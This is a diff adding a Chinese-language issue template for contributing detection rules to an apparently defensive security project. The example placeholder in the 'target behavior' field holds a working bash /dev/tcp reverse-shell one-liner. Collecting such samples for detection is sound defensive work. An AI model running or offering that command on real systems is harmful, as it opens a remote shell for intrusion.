@@ -1,0 +1,50 @@
+name: 检测规则贡献
+description: 贡献新检测规则或改进现有规则（rules/seed）
+labels: ["detection"]
+body:
+  - type: textarea
+    id: behavior
+    attributes:
+      label: 目标行为
+      description: 要检测的攻击行为/命令，给出完整可执行的样本（命令行、脚本或事件序列）。
+      placeholder: "例：攻击者通过 /dev/tcp 构造反弹 shell：bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'"
+    validations:
+      required: true
+  - type: dropdown
+    id: layer
+    attributes:
+      label: 建议落点
+      options:
+        - 规则层（rules/seed，正则/字段匹配）
+        - 意图层（intent 标签 + 分值）
+        - 不确定，请维护者判断
+    validations:
+      required: true
+  - type: dropdown
+    id: severity
+    attributes:
+      label: 建议严重级别
+      options:
+        - critical
+        - high
+        - medium
+        - low
+    validations:
+      required: true
+  - type: textarea
+    id: fp-boundary
+    attributes:
+      label: 误报边界
+      description: 哪些正常运维/业务动作会产生同类事件？为什么现有规则没覆盖（若知道）？
+      placeholder: "例：运维 curl 健康检查会打同一端口段，需用动词/路径约束区分。"
+    validations:
+      required: true
+  - type: checkboxes
+    id: checks
+    attributes:
+      label: 自查（PR 前完成）
+      options:
+        - label: 我已把样本加进 tools/benchmark/corpus.yaml（或误报面进 probes.yaml）。
+          required: false
+        - label: 我跑过 r5check 双门禁且退出码为 0，检出/误报有前后对比。
+          required: false
